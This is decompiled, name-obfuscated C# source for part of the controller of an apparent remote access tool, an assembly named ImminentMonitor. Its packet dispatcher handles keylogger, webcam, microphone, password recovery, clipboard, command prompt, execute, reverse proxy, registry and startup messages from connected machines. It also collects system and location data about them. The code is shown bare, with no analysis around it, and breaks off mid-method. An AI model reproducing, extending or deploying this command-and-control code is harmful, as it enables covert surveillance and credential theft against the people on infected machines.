// Decompiled with JetBrains decompiler
// Type: GClass21
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent.IServerVars;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public sealed class GClass21
{
  public bool bool_0;
  public long long_0;
  public long long_1;
  public long long_2;
  public bool bool_1;
  public byte[] byte_0;
  private GClass11 gclass11_0;

  public GClass21()
  {
    this.bool_0 = false;
    this.long_0 = 0L;
    this.long_1 = 0L;
    this.long_2 = 0L;
    this.bool_1 = false;
    this.gclass11_0 = new GClass11();
  }

  public void method_0(GClass30 gclass30_0, GClass18 gclass18_0, bool bool_2)
  {
    if (bool_2)
    {
      Class97.gclass2_0.method_0(string.Format("[Network] Incoming connection from {0}:{1}, initializing handshake...", (object) gclass18_0.method_24().Address.ToString(), (object) gclass18_0.method_24().Port.ToString()), Class97.gclass2_0.textStyle_2);
      this.method_5(gclass18_0);
    }
    else
    {
      this.method_8(gclass18_0);
      Class108.smethod_6(false, gclass18_0);
    }
  }

  public void method_1(GClass30 gclass30_0, Exception exception_0)
  {
    Class97.gclass2_0.method_0("[Server Error] " + exception_0.Message + exception_0.StackTrace, Class97.gclass2_0.textStyle_3);
    Class97.smethod_24(exception_0.GetType().ToString(), exception_0.StackTrace);
  }

  public void method_2(
    GClass30 gclass30_0,
    GClass18 gclass18_0,
    double double_0,
    int int_0,
    int int_1,
    int int_2)
  {
    if (gclass18_0.method_20().connectionSocketPacket_0 != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket)
      return;
    this.method_3(gclass18_0, int_2);
  }

  private void method_3(GClass18 gclass18_0, int int_0) => this.method_57(gclass18_0.method_20().string_0).method_20().long_0 += (long) int_0;

  public void method_4(
    GClass18 gclass18_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader packetHeader_0,
    object[] object_0)
  {
    try
    {
      switch (packetHeader_0)
      {
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Initialize:
          this.method_12(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.SystemInformation:
          this.method_24(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Processes:
          this.method_26(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window:
          this.method_27(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ClipBoardGet:
          this.method_32(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader:
          this.method_33(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop:
          this.method_34(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.NewConnection:
          this.method_15(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileTransfer:
          this.method_43(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReverseProxy:
          this.method_42(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Startup:
          this.method_29(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Location:
          this.method_18(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ThumbnailView:
          this.method_50(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Webcam:
          this.method_36(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Ping:
          this.method_19(gclass18_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Keylogger:
          this.method_37(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Chat:
          this.method_41(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CommandPrompt:
          this.method_30(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Execute:
          this.method_40(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.TcpConnections:
          this.method_31(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Microphone:
          this.method_38(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.PasswordRecovery:
          this.method_39(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ChangeEncryptionKey:
          this.method_17(gclass18_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.KeepAlive:
          this.method_22(gclass18_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.UpdateInfo:
          this.method_20(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry:
          this.method_28(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Plugin:
          Class85.smethod_0(gclass18_0, (string) object_0[2], object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP:
          this.method_35(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.NetworkStats:
          this.method_23(gclass18_0, object_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CrossPlatformInitialize:
          this.method_6(gclass18_0);
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ReportInvalid:
          this.method_63(Conversions.ToString(object_0[1]));
          break;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (!exception.Message.Contains("disposed"))
      {
        Class97.smethod_24(exception.GetType().ToString(), exception.StackTrace);
        Class97.gclass2_0.method_0("[Server Error] " + exception.Message + exception.StackTrace, Class97.gclass2_0.textStyle_3);
      }
      ProjectData.ClearProjectError();
    }
  }

  public void method_5(GClass18 gclass18_0)
  {
    gclass18_0.method_21(new GClass32());
    this.method_7(gclass18_0, Guid.NewGuid().ToString());
  }

  public void method_6(GClass18 gclass18_0)
  {
    gclass18_0.method_7(true);
    gclass18_0.method_9(true);
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.CrossPlatformInitialize,
      (object) Guid.NewGuid().ToString()
    });
  }

  private void method_7(GClass18 gclass18_0, string string_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Initialize,
    (object) string_0
  });

  public void method_8(GClass18 gclass18_0)
  {
    GClass21.Class114 class114 = new GClass21.Class114();
    class114.gclass18_0 = gclass18_0;
    class114.gclass21_0 = this;
    if (class114.gclass18_0 == null)
      return;
    if (Operators.CompareString(class114.gclass18_0.method_20().string_0, (string) null, false) != 0 && class114.gclass18_0.method_20().bool_0)
    {
      Class97.list_0.Remove(class114.gclass18_0);
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_1(class114.gclass18_0, false);
      Class97.formMain_0.vmethod_0().method_13(class114.gclass18_0);
    }
    switch (class114.gclass18_0.method_20().connectionSocketPacket_0)
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.DesktopSocket:
        if (class114.gclass18_0.method_20().formDesktop_0 == null || !class114.gclass18_0.method_20().formDesktop_0.IsHandleCreated)
          break;
        class114.gclass18_0.method_20().formDesktop_0.Invoke((Delegate) new Delegate0(class114._Lambda\u0024__80));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket:
        if (class114.gclass18_0.method_20().formFileManager_0 == null)
          break;
        class114.gclass18_0.method_20().formFileManager_0.Invoke((Delegate) new Delegate0(class114._Lambda\u0024__81));
        break;
    }
  }

  private void method_9(GClass18 gclass18_0)
  {
    try
    {
      foreach (ListViewItem listViewItem in gclass18_0.method_20().formFileManager_0.vmethod_54().Items)
      {
        listViewItem.SubItems[3].Text = "Finished";
        listViewItem.SubItems[4].Text = "Finished";
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public void method_10(GClass18 gclass18_0)
  {
    gclass18_0.method_23(new IServerClient());
    gclass18_0.method_22().Connected = gclass18_0.method_25();
    gclass18_0.method_22().EndPoint = gclass18_0.method_24();
    gclass18_0.method_22().IServerState = new IServerState();
    gclass18_0.method_22().IServerState.Country = gclass18_0.method_20().string_7;
    gclass18_0.method_22().IServerState.UID = gclass18_0.method_20().string_0;
    gclass18_0.method_22().IServerState.UserName = gclass18_0.method_20().string_1;
  }

  public bool method_11(string string_0, string string_1, string string_2)
  {
    byte[] signature = Convert.FromBase64String(string_0);
    byte[] bytes = Encoding.UTF8.GetBytes(string_2);
    RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
    cryptoServiceProvider.FromXmlString(string_1);
    return cryptoServiceProvider.VerifyData(bytes, (object) new SHA1CryptoServiceProvider(), signature);
  }

  public void method_12(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      string string_0 = (string) object_0[1];
      gclass18_0.method_21(new GClass32());
      if (gclass18_0.method_12())
      {
        GClass18 gclass18_0_1 = new GClass18();
        gclass18_0_1.method_13(true);
        gclass18_0_1.method_21(new GClass32());
        gclass18_0_1.method_20().string_0 = string_0;
        if (!this.method_56(string_0))
          gclass18_0_1.method_20().bool_0 = true;
        Class97.list_0.Add(gclass18_0_1);
        gclass18_0_1.method_20().connectionSocketPacket_0 = (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket) Convert.ChangeType(RuntimeHelpers.GetObjectValue(object_0[2]), typeof (byte));
        switch (gclass18_0_1.method_20().connectionSocketPacket_0)
        {
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.CommandSocket:
            if (object_0.Length != 4)
              break;
            gclass18_0_1.method_11(true);
            dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_5(gclass18_0_1);
            break;
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.DesktopSocket:
            gclass18_0_1.method_20().formDesktop_0 = this.method_57(string_0).method_20().formDesktop_0;
            this.method_13(gclass18_0_1);
            break;
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket:
            gclass18_0_1.method_17(true);
            this.method_14(gclass18_0_1, string_0);
            break;
        }
      }
      else
      {
        if (!this.method_56(string_0))
          gclass18_0.method_20().bool_0 = true;
        gclass18_0.method_20().string_0 = string_0;
        gclass18_0.method_20().connectionSocketPacket_0 = (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket) Convert.ChangeType(RuntimeHelpers.GetObjectValue(object_0[2]), typeof (byte));
        switch (gclass18_0.method_20().connectionSocketPacket_0)
        {
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.DesktopSocket:
            gclass18_0.method_20().formDesktop_0 = this.method_57(string_0).method_20().formDesktop_0;
            this.method_13(gclass18_0);
            break;
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket:
            gclass18_0.method_17(true);
            this.method_14(gclass18_0, string_0);
            break;
          case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.WebcamSocket:
            gclass18_0.method_20().formCamera_0 = this.method_57(string_0).method_20().formCamera_0;
            break;
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_13(GClass18 gclass18_0)
  {
    GClass21.Class117 class117 = new GClass21.Class117();
    class117.gclass18_0 = gclass18_0;
    class117.gclass18_0.method_20().formDesktop_0.Invoke((Delegate) new Delegate0(class117._Lambda\u0024__82));
  }

  private void method_14(GClass18 gclass18_0, string string_0)
  {
    gclass18_0.method_20().formFileManager_0 = this.method_57(string_0).method_20().formFileManager_0;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.RequestNext
    });
  }

  private void method_15(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      Class97.formMain_0.vmethod_0().method_5(gclass18_0, object_0);
      this.method_10(gclass18_0);
      Class108.smethod_6(true, gclass18_0);
      try
      {
        foreach (GClass43 gclass43_0 in Class108.list_0)
        {
          if (!gclass43_0.method_22())
            Class90.smethod_0(gclass18_0, gclass43_0);
        }
      }
      finally
      {
        List<GClass43>.Enumerator enumerator;
        enumerator.Dispose();
      }
      if (gclass18_0.method_8())
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_5(gclass18_0);
      if (!Class97.formMain_0.vmethod_18().bool_0)
        return;
      if (Class97.formMain_0.vmethod_18().vmethod_4().Checked)
        this.method_16(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Create, false, true);
      else
        this.method_16(gclass18_0, dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Create, true, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_16(
    GClass18 gclass18_0,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket thumbnailPacket_0,
    bool bool_2,
    bool bool_3)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[5]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ThumbnailView,
      (object) thumbnailPacket_0,
      (object) bool_2,
      (object) bool_3,
      (object) 0
    });
  }

  private void method_17(GClass18 gclass18_0)
  {
    try
    {
      if (!gclass18_0.method_12())
        gclass18_0.method_15(this.byte_0);
      gclass18_0.method_20().bool_1 = true;
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_5(gclass18_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_18(GClass18 gclass18_0, object[] object_0)
  {
    try
    {
      gclass18_0.method_20().string_11 = object_0[1].ToString().Replace(',', '.');
      gclass18_0.method_20().string_10 = object_0[2].ToString().Replace(',', '.');
      gclass18_0.method_20().string_8 = object_0[4].ToString().Trim().Replace(Environment.NewLine, (string) null).Replace("\r\n", (string) null);
      gclass18_0.method_20().string_9 = object_0[5].ToString().Trim().Replace(Environment.NewLine, (string) null).Replace("\r\n", (string) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_19(GClass18 gclass18_0)
  {
    GClass21.Class124 class124 = new GClass21.Class124();
    class124.gclass18_0 = gclass18_0;
    try
    {
      class124.gclass18_0.method_20().stopwatch_0.Stop();
      Class97.formMain_0.vmethod_0().vmethod_108().Invoke((Delegate) new Delegate0(class124._Lambda\u0024__83));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_20(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class118 class118 = new GClass21.Class118();
    class118.object_0 = object_0;
    class118.gclass21_0 = this;
    class118.listViewItem_0 = gclass18_0.method_20().listViewItem_4;
    if (class118.listViewItem_0 == null)
      return;
    Class97.formMain_0.vmethod_0().Invoke((Delegate) new Delegate0(class118._Lambda\u0024__84));
  }

  public string method_21(int int_0) => new TimeSpan(0, 0, int_0).ToString();

  private void method_22(GClass18 gclass18_0) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.KeepAlive
  });

  private void method_23(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class129 class129 = new GClass21.Class129();
    class129.object_0 = object_0;
    class129.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class129.gclass18_0.method_20().newFormSystemManagers_0) || class129.gclass18_0.method_20().newFormSystemManagers_0 == null)
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.NetworkStatPacket) class129.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.NetworkStatPacket.NetworkLog:
        class129.gclass18_0.method_20().newFormSystemManagers_0.Invoke((Delegate) new Delegate0(class129._Lambda\u0024__85));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.NetworkStatPacket.SystemLog:
        class129.gclass18_0.method_20().newFormSystemManagers_0.Invoke((Delegate) new Delegate0(class129._Lambda\u0024__86));
        break;
    }
  }

  private void method_24(GClass18 gclass18_0, object[] object_0)
  {
    if (!this.method_53((Form) gclass18_0.method_20().newFormSystemManagers_0))
      return;
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; ++index)
      object_0[index] = (object) Class97.smethod_21(Conversions.ToString(object_0[index]));
    this.method_25(gclass18_0, "clientInformationList", "account", Conversions.ToString(object_0[2]));
    this.method_25(gclass18_0, "clientInformationList", "account-box", Conversions.ToString(object_0[3]));
    this.method_25(gclass18_0, "networkInformationList", "network", "WAN: " + gclass18_0.method_24().ToString());
    this.method_25(gclass18_0, "networkInformationList", "network-locked", Conversions.ToString(object_0[4]));
    this.method_25(gclass18_0, "networkInformationList", "laptop-chromebook", Conversions.ToString(object_0[5]));
    this.method_25(gclass18_0, "computerSpecificationsList", "windows", Conversions.ToString(object_0[6]));
    this.method_25(gclass18_0, "computerSpecificationsList", "desktop-mac", Conversions.ToString(object_0[7]));
    this.method_25(gclass18_0, "computerSpecificationsList", "desktop-windows", Conversions.ToString(object_0[8]));
    this.method_25(gclass18_0, "computerSpecificationsList", "alert-triangle", Conversions.ToString(object_0[9]));
    this.method_25(gclass18_0, "computerSpecificationsList", "devices", Conversions.ToString(object_0[10]));
    this.method_25(gclass18_0, "computerSpecificationsList", "memory", Conversions.ToString(object_0[11]));
    this.method_25(gclass18_0, "computerSpecificationsList", "nfc", Conversions.ToString(object_0[12]));
    this.method_25(gclass18_0, "computerSpecificationsList", "developer-board", Conversions.ToString(object_0[13]));
    this.method_25(gclass18_0, "computerSpecificationsList", "developer-board", Conversions.ToString(object_0[14]));
    this.method_25(gclass18_0, "computerSpecificationsList", "battery", Conversions.ToString(object_0[15]));
    this.method_25(gclass18_0, "computerSpecificationsList", "rotate-ccw", Conversions.ToString(object_0[16]));
    this.method_25(gclass18_0, "securityList", "alert-octagon", Conversions.ToString(object_0[17]));
    this.method_25(gclass18_0, "securityList", "assignment-alert", Conversions.ToString(object_0[18]));
  }

  private void method_25(GClass18 gclass18_0, string string_0, string string_1, string string_2)
  {
    GClass21.Class126 class126 = new GClass21.Class126();
    class126.gclass18_0 = gclass18_0;
    class126.string_0 = string.Format("$('#{0}').append('{1}');", (object) string_0, (object) string.Format(Class145.smethod_68(), (object) ("md-" + string_1), (object) string_2));
    class126.gclass18_0.method_20().newFormSystemManagers_0.Invoke((Delegate) new Delegate0(class126._Lambda\u0024__87));
  }

  private void method_26(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class125 class125 = new GClass21.Class125();
    class125.object_0 = object_0;
    class125.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class125.gclass18_0.method_20().newFormSystemManagers_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket) Convert.ChangeType(RuntimeHelpers.GetObjectValue(class125.object_0[1]), typeof (byte)))
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Refresh:
        class125.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().Invoke((Delegate) new Delegate0(class125._Lambda\u0024__88));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Kill:
        class125.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().Invoke((Delegate) new Delegate0(class125._Lambda\u0024__89));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Suspend:
        class125.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().Invoke((Delegate) new Delegate0(class125._Lambda\u0024__90));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.ResumeProcess:
        class125.gclass18_0.method_20().newFormSystemManagers_0.vmethod_6().Invoke((Delegate) new Delegate0(class125._Lambda\u0024__91));
        break;
    }
  }

  public void method_27(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class131 class131 = new GClass21.Class131();
    class131.object_0 = object_0;
    class131.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class131.gclass18_0.method_20().newFormSystemManagers_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket) class131.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Refresh:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__92));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Caption:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__93));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Suspend:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__97));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.ResumeWindow:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__98));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Hide:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__94));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Show:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__95));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Minimize:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__99));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Restore:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__100));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Close:
        class131.gclass18_0.method_20().newFormSystemManagers_0.vmethod_8().Invoke((Delegate) new Delegate0(class131._Lambda\u0024__96));
        break;
    }
  }

  public void method_28(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class128 class128 = new GClass21.Class128();
    class128.object_0 = object_0;
    class128.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class128.gclass18_0.method_20().newFormSystemManagers_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket) class128.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.SubKeyList:
        class128.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().Invoke((Delegate) new Delegate0(class128._Lambda\u0024__101));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.RetrieveValueList:
        class128.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().Invoke((Delegate) new Delegate0(class128._Lambda\u0024__102));
        break;
